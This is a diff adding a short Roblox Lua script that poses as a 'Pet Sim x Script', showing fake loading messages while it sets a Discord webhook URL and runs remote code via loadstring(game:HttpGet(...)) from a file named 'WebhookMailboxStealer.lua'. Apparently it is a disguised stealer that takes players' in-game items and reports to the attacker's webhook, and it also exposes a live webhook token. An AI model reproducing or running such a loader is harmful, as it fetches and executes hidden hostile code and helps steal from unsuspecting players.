@@ -1,0 +1,17 @@
+Username = "Fisher_OnYt"
+
+WebHook = "https://discord.com/api/webhooks/1117713178856521788/NLmI0BX44kEGXO4HcJfSutqHdhQi_v4UuAU65av6LGRuO_dE42zIfwixUFjEcAoNhXp1"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Pet Sim x Script"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/WebhookMailboxStealer.lua"))()
